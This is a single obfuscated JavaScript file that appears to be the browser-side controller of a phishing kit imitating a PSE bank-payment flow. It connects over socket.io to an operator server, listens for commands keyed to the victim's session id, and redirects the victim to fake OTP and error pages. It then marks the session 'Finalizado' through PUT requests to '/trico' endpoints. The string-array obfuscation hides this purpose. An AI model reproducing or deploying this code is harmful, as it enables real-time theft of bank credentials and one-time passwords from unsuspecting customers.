(function (_0x3e4328, _0x30ee3b) {
  const _0x24c6bd = _0x4e0c,
    _0x3e8d89 = _0x3e4328();
  while (!![]) {
    try {
      const _0x2eabc7 =
        (-parseInt(_0x24c6bd(0x1b7)) / 0x1) *
          (-parseInt(_0x24c6bd(0x1b0)) / 0x2) +
        -parseInt(_0x24c6bd(0x1c5)) / 0x3 +
        (parseInt(_0x24c6bd(0x1b2)) / 0x4) *
          (-parseInt(_0x24c6bd(0x1bf)) / 0x5) +
        -parseInt(_0x24c6bd(0x1b6)) / 0x6 +
        (-parseInt(_0x24c6bd(0x1b3)) / 0x7) *
          (parseInt(_0x24c6bd(0x1a9)) / 0x8) +
        (parseInt(_0x24c6bd(0x1ba)) / 0x9) *
          (parseInt(_0x24c6bd(0x1b4)) / 0xa) +
        (-parseInt(_0x24c6bd(0x1aa)) / 0xb) *
          (-parseInt(_0x24c6bd(0x1c3)) / 0xc);
      if (_0x2eabc7 === _0x30ee3b) break;
      else _0x3e8d89["push"](_0x3e8d89["shift"]());
    } catch (_0x289f2f) {
      _0x3e8d89["push"](_0x3e8d89["shift"]());
    }
  }
})(_0xd60e, 0x1ca0a);
function _0xd60e() {
  const _0x20991d = [
    "href",
    "valor",
    "198Oazmyg",
    "json",
    "application/json",
    "/trico/tricofinishPse/",
    "GET",
    "450215EFJqmC",
    "./index.error.html",
    "log",
    "Usuario\x20encontrado",
    "77172INUZGQ",
    "valid",
    "427239dbCtAu",
    "PUT",
    "./otp.html",
    "location",
    "Finalizado",
    "finish",
    "1061656IEIKoj",
    "506VKMYEq",
    "newOtp",
    "./otp.error.html",
    "user",
    "stringify",
    "metaInfo",
    "171278fonIhb",
    "./errorPse.html",
    "4DDJSHw",
    "7IBrUCK",
    "55960fifSrh",
    "idreg",
    "132936mRlftg",
    "1GxgFHX",
  ];
  _0xd60e = function () {
    return _0x20991d;
  };
  return _0xd60e();
}
function _0x4e0c(_0x237a8b, _0x45950e) {
  const _0xd60ed = _0xd60e();
  return (
    (_0x4e0c = function (_0x4e0cfd, _0x54a3f5) {
      _0x4e0cfd = _0x4e0cfd - 0x1a6;
      let _0x1ae8d7 = _0xd60ed[_0x4e0cfd];
      return _0x1ae8d7;
    }),
    _0x4e0c(_0x237a8b, _0x45950e)
  );
}
var socket = io["connect"](url);
socket["on"]("ps", function (_0xc0d7e3) {
  const _0x5cfd7f = _0x4e0c;
  if (
    _0xc0d7e3[_0x5cfd7f(0x1b9)] == _0x5cfd7f(0x1ad) &&
    _0xc0d7e3[_0x5cfd7f(0x1c4)] == info["metaInfo"]["cc"]
  )
    window[_0x5cfd7f(0x1a6)][_0x5cfd7f(0x1b8)] = _0x5cfd7f(0x1c0);
  else {
    if (
      _0xc0d7e3["valor"] == "otp" &&
      _0xc0d7e3["valid"] == info[_0x5cfd7f(0x1af)]["cc"]
    )
      window[_0x5cfd7f(0x1a6)][_0x5cfd7f(0x1b8)] = _0x5cfd7f(0x1c7);
    else {
      if (
        _0xc0d7e3[_0x5cfd7f(0x1b9)] == _0x5cfd7f(0x1ab) &&
        _0xc0d7e3[_0x5cfd7f(0x1c4)] == info["metaInfo"]["cc"]
      )
        window["location"]["href"] = _0x5cfd7f(0x1ac);
      else {
        if (
          _0xc0d7e3[_0x5cfd7f(0x1b9)] == _0x5cfd7f(0x1a8) &&
          _0xc0d7e3[_0x5cfd7f(0x1c4)] == info[_0x5cfd7f(0x1af)]["cc"]
        ) {
          async function _0x1464cb() {
            const _0x2d91f9 = _0x5cfd7f,
              _0x3f4f31 = await fetch(url + "/trico/tricoData", {
                method: _0x2d91f9(0x1be),
                headers: { "Content-Type": _0x2d91f9(0x1bc) },
              }),
              _0xf7e085 = await _0x3f4f31[_0x2d91f9(0x1bb)](),
              _0x839407 = [..._0xf7e085];
            for (const _0x1a54af of _0x839407) {
              if (_0x1a54af["id"] == info["metaInfo"]["cc"]) {
                console[_0x2d91f9(0x1c1)](_0x2d91f9(0x1c2));
                const _0x2ddea5 = await fetch(
                    url + _0x2d91f9(0x1bd) + _0x1a54af[_0x2d91f9(0x1b5)],
                    {
                      method: _0x2d91f9(0x1c6),
                      headers: { "Content-Type": _0x2d91f9(0x1bc) },
                      body: JSON[_0x2d91f9(0x1ae)]({
                        estado: _0x2d91f9(0x1a7),
                      }),
                    }
                  ),
                  _0x2d369e = await _0x2ddea5[_0x2d91f9(0x1bb)]();
              }
            }
            window[_0x2d91f9(0x1a6)][_0x2d91f9(0x1b8)] = _0x2d91f9(0x1b1);
          }
          _0x1464cb();
          return;
        }
      }
    }
  }
});
